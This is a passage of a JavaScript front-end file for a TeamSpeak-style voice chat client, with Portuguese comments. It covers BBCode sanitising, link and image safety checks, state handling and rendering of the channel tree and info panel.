/* app.js — interface do Furito TS (estilo cliente clássico). Sem build, sem dependências. */
(function () {
  'use strict';

  // ------------------------------------------------------------------ utilitários
  const $ = (id) => document.getElementById(id);
  const HTML_ESC = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };
  // Os caracteres que forçam a direção do texto (U+202A–202E, U+2066–2069) são
  // retirados de tudo o que vai para a tela: com eles um nome de arquivo como
  // "fotos<U+202E>gnp.exe" apareceria como "fotosexe.png".
  const BIDI_RE = /[\u202A-\u202E\u2066-\u2069]/g;
  const esc = (s) => String(s == null ? '' : s).replace(BIDI_RE, '').replace(/[&<>"']/g, (c) => HTML_ESC[c]);
  const icon = (name, cls) => `<svg class="ic${cls ? ' ' + cls : ''}" aria-hidden="true"><use href="#i-${name}"/></svg>`;
  const errText = (e) => (e && e.message ? e.message : String(e == null ? 'erro desconhecido' : e));
  const clamp = (v, lo, hi) => Math.max(lo, Math.min(hi, v));
  const pad2 = (n) => (n < 10 ? '0' + n : '' + n);
  const fmtTime = (ms) => { const d = new Date(ms || Date.now()); return pad2(d.getHours()) + ':' + pad2(d.getMinutes()) + ':' + pad2(d.getSeconds()); };
  const debounce = (fn, ms) => { let t = 0; return (...a) => { clearTimeout(t); t = setTimeout(() => fn(...a), ms); }; };

  function fmtDuration(ms) {
    let s = Math.max(0, Math.floor(ms / 1000));
    const d = Math.floor(s / 86400); s -= d * 86400;
    const h = Math.floor(s / 3600); s -= h * 3600;
    const m = Math.floor(s / 60); s -= m * 60;
    const p = (n, one, many) => n + ' ' + (n === 1 ? one : many);
    const parts = [];
    if (d) parts.push(p(d, 'dia', 'dias'));
    if (h) parts.push(p(h, 'hora', 'horas'));
    if (m) parts.push(p(m, 'minuto', 'minutos'));
    if (!d && !h) parts.push(p(s, 'segundo', 'segundos'));
    return parts.slice(0, 2).join(' ');
  }

  function loadPrefs() { try { return JSON.parse(localStorage.getItem('furito.ui') || '{}') || {}; } catch (e) { return {}; } }
  function savePrefs(patch) { try { localStorage.setItem('furito.ui', JSON.stringify(Object.assign(loadPrefs(), patch))); } catch (e) { /* sem armazenamento */ } }

  // ------------------------------------------------------------------ BBCode seguro
  const COLOR_RE = /^(#[0-9a-f]{3}|#[0-9a-f]{4}|#[0-9a-f]{6}|#[0-9a-f]{8}|[a-z]{3,20})$/i;
  // Tags do TeamSpeak com equivalente direto em HTML: [abertura, fechamento].
  const BB_SIMPLE = {
    b: ['<b>', '</b>'], i: ['<i>', '</i>'], u: ['<u>', '</u>'], s: ['<s>', '</s>'], strike: ['<s>', '</s>'],
    sup: ['<sup>', '</sup>'], sub: ['<sub>', '</sub>'],
    center: ['<div class="bb-center">', '</div>'], left: ['<div class="bb-left">', '</div>'], right: ['<div class="bb-right">', '</div>'],
    table: ['<table class="bb-table">', '</table>'], tr: ['<tr>', '</tr>'], td: ['<td>', '</td>'], th: ['<th>', '</th>'],
  };
  const BB_STRIP = /^(font|quote|code)$/; // sem equivalente: a tag some, o texto fica

  // [size=12] / [size=+2]: os tamanhos do TS são em pontos; aqui viram px limitados.
  function bbSize(arg) {
    const v = String(arg == null ? '' : arg).trim();
    const n = parseInt(v, 10);
    if (isNaN(n)) return 13;
    return clamp(/^[+-]/.test(v) ? 13 + 2 * n : n, 8, 32);
  }

  function safeUrl(raw) {
    let s = String(raw == null ? '' : raw).trim();
    if (!s || /\s/.test(s)) return null;
    if (!/^[a-z][a-z0-9+.-]*:/i.test(s)) {
      if (!/^[\w-]+(\.[\w-]+)+([/?#]\S*)?$/.test(s)) return null;
      s = 'https://' + s;
    }
    try {
      const u = new URL(s);
      return u.protocol === 'http:' || u.protocol === 'https:' ? u.href : null;
    } catch (e) { return null; }
  }

  // Um link nunca tem href: quem abre o endereço é o navegador do sistema, a
  // pedido do clique (ver o tratador de 'a[data-url]'). Com href, um clique com
  // o botão do meio ou um arrasto fariam a própria janela do app navegar para
  // uma página de fora.
  function linkHtml(url, labelHtml) {
    return `<a class="lnk" data-url="${esc(url)}" role="link" tabindex="0" title="${esc(url)}">${labelHtml}</a>`;
  }

  // Rótulo de um [url=destino]texto[/url]. Se o texto parece um endereço de
  // outro site, o destino verdadeiro aparece ao lado: senão
  // [url=site-falso]https://site-de-confianca[/url] enganaria quem clica.
  function linkLabel(url, text) {
    const shown = safeUrl(text);
    if (!shown) return esc(text);
    let real = '', seen = '';
    try { real = new URL(url).host; seen = new URL(shown).host; } catch (e) { return esc(text); }
    return real === seen ? esc(text) : esc(text) + ` <span class="lnk-real">(abre ${esc(real)})</span>`;
  }

  // Imagens de fora só carregam de endereços públicos: um [img] apontando para
  // a rede local faria o app mandar pedidos ao roteador ou a serviços do
  // próprio computador.
  function publicImageUrl(url) {
    let host;
    try { host = new URL(url).hostname.toLowerCase(); } catch (e) { return false; }
    if (!host || host[0] === '[' || host.indexOf('.') === -1) return false; // IPv6 literal, "localhost", nomes da rede local
    if (/(^|\.)(localhost|local|lan|home|internal|intranet|corp)$/.test(host)) return false;
    const ip = /^(\d+)\.(\d+)\.(\d+)\.(\d+)$/.exec(host);
    if (!ip) return true;
    const a = +ip[1], b = +ip[2];
    return !(a === 0 || a === 10 || a === 127 || a >= 224 || (a === 100 && b >= 64 && b <= 127) ||
      (a === 169 && b === 254) || (a === 172 && b >= 16 && b <= 31) || (a === 192 && b === 168));
  }

  // Imagens que o usuário mandou carregar nesta sessão (clicando nelas).
  const shownImages = new Set();

  // imageHtml: uma imagem de fora, conforme a política (ver bbcode).
  //  'link'  → só o endereço, clicável (abre no navegador)
  //  'click' → um marcador; a imagem carrega quando o usuário clica nele
  //  'auto'  → a imagem
  function imageHtml(url, mode, cls) {
    if (!publicImageUrl(url)) mode = 'link';
    if (mode === 'click' && shownImages.has(url)) mode = 'auto';
    if (mode === 'auto') return `<img class="${cls || 'bb-img'}" src="${esc(url)}" alt="" loading="lazy" referrerpolicy="no-referrer">`;
    if (mode === 'click') {
      let host = '';
      try { host = new URL(url).host; } catch (e) { /* já validado */ }
      return `<button type="button" class="img-ph" data-img="${esc(url)}" data-cls="${esc(cls || 'bb-img')}" title="${esc(url)}">` +
        `${icon('image')}<span>Imagem de <b>${esc(host)}</b> — clique para carregar</span></button>`;
    }
    return linkHtml(url, esc(url));
  }

  // tira a pontuação do fim de um endereço achado no texto ("…veja http://x.com.")
  function trimUrlEnd(raw) {
    let end = raw.length;
    while (end > 0 && '.,;:!?)'.indexOf(raw[end - 1]) !== -1) end--;
    return raw.slice(0, end);
  }

  // texto puro -> HTML escapado, com links automáticos e quebras de linha
  function plainHtml(text) {
    const re = /\bhttps?:\/\/[^\s<>"'\[\]]+/gi;
    let out = '', last = 0, m;
    while ((m = re.exec(text))) {
      const raw = trimUrlEnd(m[0]);
      const url = safeUrl(raw);
      out += esc(text.slice(last, m.index)) + (url ? linkHtml(url, esc(raw)) : esc(raw));
      last = m.index + raw.length;
      re.lastIndex = Math.max(last, m.index + 1);
    }
    out += esc(text.slice(last));
    return out.replace(/\r\n|\r|\n/g, '<br>');
  }

  // Linhas do registro (eventos do servidor, erros, avisos do app). O texto é
  // montado pelo app, mas leva dentro apelidos, nomes de canais, motivos e
  // mensagens de erro escritos por outras pessoas: por isso aqui só [b]…[/b]
  // tem efeito. Nada de links, cores, imagens ou quebras de linha — senão um
  // apelido como "[img]site/x[/img]" faria o app buscar a imagem (revelando o
  // IP de quem lê) só por aparecer em "fulano entrou no canal".
  const MAX_LOG_TEXT = 2000;
  function logHtml(text) {
    text = String(text == null ? '' : text);
    if (text.length > MAX_LOG_TEXT) text = text.slice(0, MAX_LOG_TEXT) + '…';
    let out = '', bold = false, last = 0, m;
    const re = /\[(\/?)b\]/gi;
    while ((m = re.exec(text))) {
      const closing = m[1] === '/';
      if (closing !== bold) continue; // [/b] sem abrir, ou [b] dentro de [b]: fica como texto
      out += esc(text.slice(last, m.index)) + (closing ? '</b>' : '<b>');
      bold = !closing;
      last = re.lastIndex;
    }
    out += esc(text.slice(last)) + (bold ? '</b>' : '');
    return out.replace(/\s*[\r\n]+\s*/g, ' ');
  }

  // bbcode: o BBCode do TeamSpeak como HTML seguro. O texto vem de outras
  // pessoas (mensagens, descrições, a mensagem de boas-vindas).
  //   opts.images — o que fazer com [img]: 'link' (o padrão), 'click' ou 'auto'
  //                 (ver imageHtml). Em conversas é sempre 'link'.
  //   opts.max    — tamanho máximo do texto tratado (o resto é cortado).
  const BB_MAX_TEXT = 16 * 1024;
  function bbcode(text, opts) {
    opts = opts || {};
    text = String(text == null ? '' : text);
    const max = opts.max || BB_MAX_TEXT;
    if (text.length > max) text = text.slice(0, max) + '…';
    // o argumento de uma tag tem tamanho limitado: sem isso, um texto cheio de
    // "[a=" faria cada tentativa percorrer a linha inteira
    const re = /\[(\/?)([a-z]{1,12}|\*)(?:=([^\]\r\n]{0,2048}))?\]/gi;
    const stack = []; // tags abertas: { tag, close }
    let out = '', last = 0, m;

    // Posição do próximo [/tag] a partir de from (-1 = não há). Guarda o que já
    // achou: um texto com milhares de [url] sem fechamento é percorrido uma vez.
    const closeAt = {};
    const findClose = (tag, from) => {
      const known = closeAt[tag];
      if (known === -1 || known >= from) return known;
      const needle = '[/' + tag + ']';
      let i = from, found = -1;
      while ((i = text.indexOf('[/', i)) !== -1) {
        if (text.substr(i, needle.length).toLowerCase() === needle) { found = i; break; }
        i += 2;
      }
      closeAt[tag] = found;
      return found;
    };

    const top = () => (stack.length ? stack[stack.length - 1].tag : '');
    const isOpen = (tag) => stack.some((x) => x.tag === tag);
    const open = (tag, openHtml, closeHtml) => { stack.push({ tag, close: closeHtml }); return openHtml; };
    const closeTo = (tag) => {
      let idx = -1;
      for (let i = stack.length - 1; i >= 0; i--) if (stack[i].tag === tag) { idx = i; break; }
      let html = '';
      if (idx !== -1) while (stack.length > idx) html += stack.pop().close;
      return html;
    };
    // Texto entre duas tags. ctx é a tag que estava aberta ANTES da tag atual.
    //  - Entre [table]/[tr] e as células, as quebras de linha são só formatação
    //    do texto-fonte; se virassem <br>, o navegador as jogaria para cima da tabela.
    //  - Depois de um bloco ([hr], [/table], [/center]…) a linha já quebrou:
    //    a quebra escrita logo em seguida não vira uma linha em branco extra.
    let eatBreak = false;
    const emitText = (seg, ctx) => {
      if (eatBreak) { seg = seg.replace(/^[ \t]*(\r\n|\r|\n)/, ''); eatBreak = false; }
      return (ctx === 'table' || ctx === 'tr') && !seg.trim() ? '' : plainHtml(seg);
    };
    const BLOCK_END = /^(center|left|right|list|table)$/;

    while ((m = re.exec(text))) {
      const closing = m[1] === '/';
      const tag = m[2].toLowerCase();
      const arg = m[3];
      const ctx = top(); // contexto do texto que vem antes desta tag
      let html = null; // null = não é tag nossa: fica como texto

      if (tag === 'hr') {
        html = closing ? '' : '<hr class="bb-hr">';
      } else if (tag === '*') {
        html = isOpen('list') ? '<li>' : '• ';
      } else if (Object.prototype.hasOwnProperty.call(BB_SIMPLE, tag)) {
        if (closing) {
          html = closeTo(tag);
        } else if (arg == null || tag === 'td' || tag === 'th' || tag === 'table') {
          html = '';
          // tabela escrita sem fechar a linha/célula anterior
          if (tag === 'tr' && isOpen('tr')) html += closeTo('tr');
          if ((tag === 'td' || tag === 'th') && (top() === 'td' || top() === 'th')) html += stack.pop().close;
          html += open(tag, BB_SIMPLE[tag][0], BB_SIMPLE[tag][1]);
        }
      } else if (tag === 'color' || tag === 'size' || tag === 'list') {
        if (closing) {
          html = closeTo(tag);
        } else if (tag === 'color') {
          html = '';
          const c = String(arg == null ? '' : arg).trim().replace(/^["']|["']$/g, '');
          if (COLOR_RE.test(c)) html = open(tag, `<span style="color:${esc(c)}">`, '</span>');
        } else if (tag === 'size') {
          html = open(tag, `<span style="font-size:${bbSize(arg)}px">`, '</span>');
        } else {
          const ordered = arg != null && String(arg).trim() !== '';
          html = open(tag, ordered ? '<ol class="bb-list">' : '<ul class="bb-list">', ordered ? '</ol>' : '</ul>');
        }
      } else if (tag === 'url' || tag === 'img') {
        html = '';
        if (!closing) {
          const end = findClose(tag, re.lastIndex);
          if (end !== -1) {
            const inner = text.slice(re.lastIndex, end).replace(/\[[^\]\r\n]{0,2048}\]/g, '');
            const hasArg = tag === 'url' && arg != null;
            const url = safeUrl(hasArg ? arg : inner);
            const shown = inner.trim() || (hasArg ? arg : '');
            // [img]: só http/https, e conforme a política de imagens de quem chamou.
            const body = !url ? esc(shown)
              : tag === 'img' ? imageHtml(url, opts.images || 'link')
              : linkHtml(url, shown ? linkLabel(url, shown) : esc(url));
            out += emitText(text.slice(last, m.index), ctx) + body;
            last = re.lastIndex = end + tag.length + 3;
            continue;
          }
        }
      } else if (BB_STRIP.test(tag)) {
        html = '';
      }

      if (html === null) continue;
      out += emitText(text.slice(last, m.index), ctx) + html;
      last = re.lastIndex;
      eatBreak = (tag === 'hr' && !closing) || (closing && BLOCK_END.test(tag));
    }
    out += emitText(text.slice(last), top());
    while (stack.length) out += stack.pop().close;
    return out;
  }

  // ------------------------------------------------------------------ estado
  function emptyState() {
    return {
      tab: 0, tabs: [],
      status: 'disconnected', error: '', host: '', reconnectAttempt: 0, autoReconnect: false,
      server: { name: '', welcomeMessage: '', version: '', platform: '', maxClients: 0, uid: '', bannerUrl: '', bannerLink: '' },
      self: { clientId: 0, channelId: 0, nickname: '', muted: false, deafened: false, away: false, awayMessage: '', talkRequested: false, recordingSince: 0, whisper: { kind: '', id: 0, name: '' } },
      channels: [], clients: [],
      identity: { id: '', name: '', uid: '', securityLevel: 0 },
      identities: [],
      appVersion: '',
      appAuthor: '',
      appSite: '',
      platform: '',
      pokePopup: true,
      images: { mode: 'ask', trusted: false },
      screen: { iceServers: [], relayOnly: false, warned: false, nativeCapture: false, stunUrl: '', turnUrl: '', turnUser: '', hasTurn: false },
      groups: { server: [], channel: [] },
      bookmarks: [],
      hotkeys: { ptt: '', toggleMute: '', toggleDeafen: '', soundStop: '', global: false, errors: {} },
      audio: { effect: 'normal', effects: [], vadMode: 'auto', vadThreshold: 300, vadFloor: 0, noiseSuppression: true, noiseMode: 'neural', autoGain: true, echoCancellation: false, echoCancellationAvailable: true, normalizeVoices: true, micTest: false, micMode: '', outputVolume: 100, soundboardVolume: 80, soundboardPlaying: false, sounds: [], captureAvailable: true, inputDevice: '', outputDevice: '', notifySounds: true, notifyPack: '', notifyPacks: [], inputDevices: [], outputDevices: [], inputChoice: '', outputChoice: '' },
    };
  }
  // Uma aba de servidor, como vem no resumo do backend (state.tabs e evento "tabs").
  function normTab(t) {
    t = t || {};
    return {
      id: Number(t.id) || 0, name: String(t.name || ''), host: String(t.host || ''),
      status: /^(connecting|connected|reconnecting)$/.test(t.status) ? t.status : 'disconnected',
      mic: !!t.mic, silenced: !!t.silenced, unread: Math.max(0, Number(t.unread) || 0),
    };
  }
  const normTabs = (list) => (Array.isArray(list) ? list : []).map(normTab).filter((t) => t.id > 0);
  function normalize(s) {
    const d = emptyState();
    s = s || {};
    // Campos novos podem faltar (ou vir null) em estados de versões antigas do backend.
    const arr = (v) => (Array.isArray(v) ? v : []);
    const self = Object.assign(d.self, s.self || {});
    self.whisper = Object.assign({ kind: '', id: 0, name: '' }, self.whisper || {});
    const audio = Object.assign(d.audio, s.audio || {});
    audio.inputDevices = arr(audio.inputDevices);
    audio.outputDevices = arr(audio.outputDevices);
    const hotkeys = Object.assign(d.hotkeys, s.hotkeys || {});
    hotkeys.errors = hotkeys.errors || {};
    const groups = s.groups || {};
    return {
      tab: Number(s.tab) || 0,
      tabs: normTabs(s.tabs),
      status: s.status || 'disconnected',
      error: s.error || '',
      host: s.host || '',
      reconnectAttempt: Number(s.reconnectAttempt) || 0,
      autoReconnect: !!s.autoReconnect,
      server: Object.assign(d.server, s.server || {}),
      self,
      channels: arr(s.channels),
      clients: arr(s.clients).map((c) => Object.assign({ volume: 100, mutedLocally: false, contact: '', channelGroupId: 0, isTalker: false, talkRequestMessage: '', avatar: '' }, c, {
        serverGroups: arr(c.serverGroups), serverGroupIds: arr(c.serverGroupIds),
      })),
      identity: Object.assign(d.identity, s.identity || {}),
      identities: arr(s.identities),
      appVersion: s.appVersion || '',
      appAuthor: s.appAuthor || '',
      appSite: safeUrl(s.appSite) || '',
      platform: s.platform || '',
      pokePopup: s.pokePopup !== false,
      images: { mode: /^(always|never)$/.test((s.images || {}).mode) ? s.images.mode : 'ask', trusted: !!(s.images || {}).trusted },
      screen: Object.assign({ iceServers: [], relayOnly: false, warned: false, nativeCapture: false, stunUrl: '', turnUrl: '', turnUser: '', hasTurn: false }, s.screen || {}),
      groups: { server: arr(groups.server), channel: arr(groups.channel) },
      bookmarks: arr(s.bookmarks),
      hotkeys,
      audio,
    };
  }

  let bridge = null, api = null;
  let state = emptyState();
  let talking = { clients: [], self: false, tx: false, micLevel: 0, voiceProb: 0 };
  let talkingSet = new Set();
  let selection = null;            // { type: 'server'|'channel'|'client', id }
  let userSelected = false;
  const collapsed = new Set();
  let treeHtml = null, infoHtml = null;
  let prevStatus = 'disconnected';

  const call = (name, ...args) => { try { return Promise.resolve(api[name](...args)); } catch (e) { return Promise.reject(e); } };
  const run = (name, args, where) => call(name, ...(args || [])).catch((e) => { localLine('error', errText(e), where); });
  const quiet = (name, ...args) => call(name, ...args).catch(() => {});

  // ------------------------------------------------------------------ canais
  const SPACER_RE = /^\[(\*|[clr])?spacer[^\]]*\](.*)$/i;
  function spacerInfo(ch) {
    if (!ch || ch.parentId !== 0) return null;
    const m = SPACER_RE.exec(ch.name || '');
    return m ? { align: (m[1] || 'l').toLowerCase(), text: m[2] } : null;
  }
  function channelLabel(ch) {
    if (!ch) return '';
    const sp = spacerInfo(ch);
    return sp ? (sp.text.trim() || 'Espaçador') : ch.name;
  }
  const findChannel = (id) => state.channels.find((c) => c.id === id);
  const findClient = (id) => state.clients.find((c) => c.id === id);
  const codecName = (n) => (n === 4 ? 'Opus Voice' : n === 5 ? 'Opus Music' : 'Codec ' + n);

  // ------------------------------------------------------------------ árvore
  function renderTree() {
    const tree = $('tree');
    let html;
    if (state.status !== 'connected') {
      html = `<div class="tree-empty">${state.status === 'connecting'
        ? 'Conectando a <b>' + esc(state.host) + '</b>…'
        : state.status === 'reconnecting'
          ? 'Conexão perdida.<br>Reconectando a <b>' + esc(state.host) + '</b>' + (state.reconnectAttempt ? ' (tentativa ' + Number(state.reconnectAttempt) + ')' : '') +
            '…<br><button type="button" class="btn" data-act="cancel-reconnect">Cancelar</button>'
          : 'Não conectado.<br>Clique em <b>Conectar</b> na barra de ferramentas.'}</div>`;
    } else {
      const byChan = new Map();
      for (const cl of state.clients) {
        if (!byChan.has(cl.channelId)) byChan.set(cl.channelId, []);
        byChan.get(cl.channelId).push(cl);
      }
      const hasKids = new Set();
      for (const ch of state.channels) if (ch.parentId) hasKids.add(ch.parentId);

      const rows = [];
      rows.push(`<div class="row server" data-type="server" data-id="0">${icon('server', 'row-ic')}<span class="label">${esc(state.server.name || state.host || 'Servidor')}</span></div>`);

      let hideBelow = -1;
      for (const ch of state.channels) {
        const depth = ch.depth || 0;
        if (hideBelow >= 0) { if (depth > hideBelow) continue; hideBelow = -1; }
        const members = byChan.get(ch.id) || [];
        const expandable = hasKids.has(ch.id) || members.length > 0;
        const isCollapsed = collapsed.has(ch.id);
        const padL = 6 + (depth + 1) * 18;
        const chev = expandable
          ? `<span class="chev${isCollapsed ? '' : ' open'}" data-id="${ch.id}">${icon('chev')}</span>`
          : '<span class="chev-sp"></span>';
        const sp = spacerInfo(ch);
        if (sp) {
          const cls = sp.align === '*' ? 'rep' : sp.align;
          const txt = sp.align === '*' ? (sp.text || ' ').repeat(Math.ceil(400 / Math.max(1, sp.text.length))) : sp.text;
          rows.push(`<div class="row channel spacer sp-${cls}" data-type="channel" data-id="${ch.id}" style="padding-left:${padL}px">${chev}<span class="label">${esc(txt)}</span></div>`);
        } else {
          const isCurrent = ch.id === state.self.channelId;
          const full = ch.maxClients >= 0 && members.length >= ch.maxClients && ch.maxClients !== -1;
          const icCls = 'row-ic ch-ic' + (ch.hasPassword ? ' locked' : full ? ' full' : isCurrent ? ' current' : '');
          let flags = '';
          if (ch.iconId) flags += iconHtml({ id: ch.iconId, title: 'Ícone do canal' });
          if (ch.isDefault) flags += `<span title="Canal padrão">${icon('check', 'fl-default')}</span>`;
          if (ch.hasPassword) flags += `<span title="Protegido por senha">${icon('lock', 'fl-lock')}</span>`;
          if (ch.neededTalkPower > 0) flags += `<span title="Canal moderado">${icon('mod', 'fl-mod')}</span>`;
          if (ch.codec === 5) flags += `<span title="Canal de música">${icon('note', 'fl-music')}</span>`;
          rows.push(`<div class="row channel" data-type="channel" data-id="${ch.id}" style="padding-left:${padL}px">${chev}${icon(isCurrent ? 'channel-on' : 'channel', icCls)}<span class="label">${esc(ch.name)}</span>${flags ? '<span class="flags">' + flags + '</span>' : ''}</div>`);
        }
        if (isCollapsed) { hideBelow = depth; continue; }
        for (const cl of members) rows.push(clientRow(cl, padL + 18));
      }
      html = rows.join('');
    }

    if (html !== treeHtml) {
      const top = tree.scrollTop;
      tree.innerHTML = html;
      tree.scrollTop = top;
      treeHtml = html;
    }
    applySelection();
    applyTalking();
    applyDropTarget();
  }

  function clientRow(cl, padL) {
    const isSelf = cl.id === state.self.clientId;
    const away = isSelf ? state.self.away : cl.away;
    const awayMsg = isSelf ? state.self.awayMessage : cl.awayMessage;
    const outMuted = isSelf ? state.self.deafened : cl.outputMuted;
    const inMuted = isSelf ? state.self.muted : cl.inputMuted;
    let st = 'idle', glyph = '', tip = '';
    if (away) { st = 'away'; glyph = icon('zz'); tip = 'Ausente'; }
    else if (outMuted) { st = 'spk'; glyph = icon('spk-s'); tip = 'Alto-falantes mutados'; }
    else if (inMuted) { st = 'mic'; glyph = icon('mic-s'); tip = 'Microfone mutado'; }
    else if (cl.type === 1) { st = 'query'; tip = 'ServerQuery'; }
    return `<div class="row client${isSelf ? ' self' : ''}" data-type="client" data-id="${cl.id}" style="padding-left:${padL}px">` +
      `<span class="chev-sp"></span><span class="cl-dot st-${st}"${tip ? ` title="${tip}"` : ''}>${glyph}</span>` +
      `<span class="label">${esc((cl.namePrefix || '') + cl.nickname + (cl.nameSuffix || ''))}</span>` +
      (away && awayMsg ? `<span class="away-msg">[${esc(awayMsg)}]</span>` : '') +
      (cl.isRecording ? '<span class="rec" title="Gravando">●</span>' : '') +
      clientIconsHtml(cl, isSelf, st, inMuted, outMuted) +
      '</div>';
  }

  // Ícones alinhados à direita do apelido, como no TeamSpeak: primeiro os de
  // estado que não couberam na bolinha da esquerda, depois grupo do canal,
  // grupos do servidor, ícone do cliente e bandeira.
  function clientIconsHtml(cl, isSelf, leftState, inMuted, outMuted) {
    let h = '';
    const scr = window.FuritoScreen;
    const sh = isSelf ? scr.sharing() : null;
    if (sh && sh.here !== false) h += `<span class="sicon screen mine" title="Você está compartilhando a tela">${icon('screen')}</span>`; // só na aba da transmissão
    else if (!isSelf && scr.isSharer(cl.id)) {
      const w = scr.watching();
      const mine = w && w.from === cl.id;
      h += `<span class="sicon screen${mine ? ' watching' : ''}" data-act="watch-screen" title="${mine ? 'Você está assistindo a esta tela' : 'Compartilhando a tela — clique para assistir'}">${icon('screen')}</span>`;
    }
    if (!isSelf && cl.contact === 'friend') h += '<span class="cmark friend" title="Amigo">♥</span>';
    if (!isSelf && cl.contact === 'blocked') h += '<span class="cmark blocked" title="Bloqueado">⊘</span>';
    if (!isSelf && cl.mutedLocally) h += `<span class="sicon local" title="Mutado para mim">${icon('spk-s')}</span>`;
    if (inMuted && leftState !== 'mic') h += `<span class="sicon" title="Microfone mutado">${icon('mic-s')}</span>`;
    if (outMuted && leftState !== 'spk') h += `<span class="sicon" title="Alto-falantes mutados">${icon('spk-s')}</span>`;
    if (!isSelf && cl.inputHardware === false && !inMuted) h += `<span class="sicon" title="Microfone desativado">${icon('mic-s')}</span>`;
    if (!isSelf && cl.outputHardware === false && !outMuted) h += `<span class="sicon" title="Som desativado">${icon('spk-s')}</span>`;
    if (cl.isChannelCommander) h += '<span class="gicon builtin" style="background:#2e86c1" title="Comandante do canal">CC</span>';
    if (cl.isPrioritySpeaker) h += '<span class="gicon builtin" style="background:#6c3483" title="Orador prioritário">PS</span>';
    if (cl.talkRequest) h += `<span class="gicon builtin" style="background:#b7950b" title="${esc('Pediu a palavra' + (cl.talkRequestMessage ? ': ' + cl.talkRequestMessage : ''))}">?</span>`;
    if (cl.isTalker) h += '<span class="gicon builtin" style="background:#1e8449" title="Com a palavra">T</span>';
    for (const ref of cl.icons || []) h += iconHtml(ref);
    h += flagHtml(cl.country);
    return h ? `<span class="icons">${h}</span>` : '';
  }

  function applySelection() {
    const tree = $('tree');
    const cur = tree.querySelector('.row.selected');
    const want = selection ? tree.querySelector(`.row[data-type="${selection.type}"][data-id="${selection.id}"]`) : null;
    if (cur && cur !== want) cur.classList.remove('selected');
    if (want && want !== cur) want.classList.add('selected');
  }

  function applyTalking() {
    const selfId = state.self.clientId;
    $('tree').querySelectorAll('.row.client').forEach((row) => {
      const id = Number(row.dataset.id);
      row.classList.toggle('talking', talkingSet.has(id) || (talking.self && id === selfId));
    });
  }

  function select(type, id, byUser) {
    selection = { type, id };
    infoHoldUntil = 0;
    if (byUser) userSelected = true;
    applySelection();
    renderInfo();
    if (type === 'channel') quiet('RequestChannelInfo', id);
    else if (type === 'client') quiet('RequestClientInfo', id);
  }

  function validateSelection() {
    if (state.status !== 'connected') { selection = null; userSelected = false; return; }
    if (selection) {
      if (selection.type === 'channel' && !findChannel(selection.id)) selection = null;
      else if (selection.type === 'client' && !findClient(selection.id)) selection = null;
    }
    if (!userSelected && state.self.clientId && findClient(state.self.clientId)) {
      if (!selection || selection.type !== 'client' || selection.id !== state.self.clientId) {
        selection = { type: 'client', id: state.self.clientId };
        quiet('RequestClientInfo', state.self.clientId);
      }
    } else if (!selection) {
      selection = { type: 'server', id: 0 };
    }
  }

  function joinChannel(id) {
    const ch = findChannel(id);
    if (!ch || spacerInfo(ch) || ch.id === state.self.channelId) return;
    if (ch.hasPassword) askPassword(ch, (pw) => run('JoinChannel', [id, pw]));
    else run('JoinChannel', [id, '']);
  }

  // ------------------------------------------------------------------ painel de informações
  const NONE = '<span class="none">—</span>';

  function renderInfo() {
    let html;
    if (state.status !== 'connected' || !selection) {
      html = `<div class="info-empty">${state.status === 'connecting' ? 'Conectando…' : state.status === 'reconnecting' ? 'Reconectando…' : 'Conecte-se a um servidor para ver as informações.'}</div>`;
    } else if (selection.type === 'client' && findClient(selection.id)) {
      html = clientInfoHtml(findClient(selection.id));
    } else if (selection.type === 'channel' && findChannel(selection.id)) {
      html = channelInfoHtml(findChannel(selection.id));
    } else {
      html = serverInfoHtml();
    }
    if (html !== infoHtml) {
      if (Date.now() < infoHoldUntil) {
        // o controle de volume está em uso: trocar o HTML agora interromperia o arrasto
        clearTimeout(infoHoldTimer);
        infoHoldTimer = setTimeout(renderInfo, infoHoldUntil - Date.now() + 30);
      } else { $('info').innerHTML = html; infoHtml = html; }
    }
    tickDurations();
  }
  let infoHoldUntil = 0, infoHoldTimer = 0;

  // só http/https explícito (imagem de banner vinda do servidor)
  function httpUrl(raw) {
    return /^https?:\/\//i.test(String(raw == null ? '' : raw).trim()) ? safeUrl(raw) : null;
  }

  // Imagens de fora no painel (descrições, boas-vindas, banner). Buscar uma
  // imagem revela o endereço IP de quem lê a quem a hospeda, e quem escolhe o
  // endereço é quem escreveu a descrição. Por isso, no modo padrão ('ask'),
  // elas só carregam com um clique — ou sozinhas nos servidores em que o
  // usuário mandou carregar sempre.
  function imagePolicy() {
    const im = state.images || {};
    if (im.mode === 'never') return 'link';
    return im.mode === 'always' || im.trusted ? 'auto' : 'click';
  }

  // bbcode das descrições, guardando o resultado: o painel é refeito a cada
  // mudança de estado, e analisar de novo um texto de vários KB a cada vez
  // deixaria a interface lenta.
  const descCache = new Map();
  function descHtml(text) {
    const policy = imagePolicy();
    const key = policy + '\u0000' + shownImages.size + '\u0000' + text;
    let html = descCache.get(key);
    if (html === undefined) {
      html = bbcode(text, { images: policy, max: 32 * 1024 });
      if (descCache.size >= 16) descCache.delete(descCache.keys().next().value);
      descCache.set(key, html);
    }
    return html;
  }

  // Abaixo de um texto com imagens à espera de clique: a opção de carregá-las
  // sempre neste servidor (e de voltar atrás, quando já está assim).
  function imageNoteHtml(html) {
    const im = state.images || {};
    if (im.mode === 'ask' && im.trusted && html.indexOf('class="bb-img"') !== -1) {
      return '<div class="img-note">Imagens deste servidor carregam sozinhas. <a class="lnk" data-act="img-untrust" role="link" tabindex="0">Voltar a perguntar</a></div>';
    }
    if (html.indexOf('class="img-ph"') === -1) return '';
    return '<div class="img-note">Carregar uma imagem mostra o seu endereço IP a quem a hospeda. ' +
      '<a class="lnk" data-act="img-trust" role="link" tabindex="0">Carregar sempre as imagens deste servidor</a></div>';
  }
  const richBlock = (text, emptyLabel) => {
    if (!text) return `<div class="desc"><span class="none">${emptyLabel}</span></div>`;
    const html = descHtml(text);
    return `<div class="desc">${html}</div>` + imageNoteHtml(html);
  };

  const kv = (k, vHtml) => `<span class="k">${k}:</span><span class="v">${vHtml}</span>`;
  const blk = (k, bodyHtml) => `<div class="blk"><div class="k">${k}:</div>${bodyHtml}</div>`;

  function serverInfoHtml() {
    const s = state.server;
    const banner = httpUrl(s.bannerUrl);
    const bannerLink = banner ? safeUrl(s.bannerLink) : null;
    // o banner segue a mesma política das imagens das descrições; à espera de
    // clique, ele é um marcador (o clique carrega a imagem, não abre o link)
    const policy = imagePolicy();
    const bannerImg = !banner || policy === 'link' ? '' : imageHtml(banner, policy, 'srv-banner');
    const loaded = bannerImg.indexOf('<img') === 0;
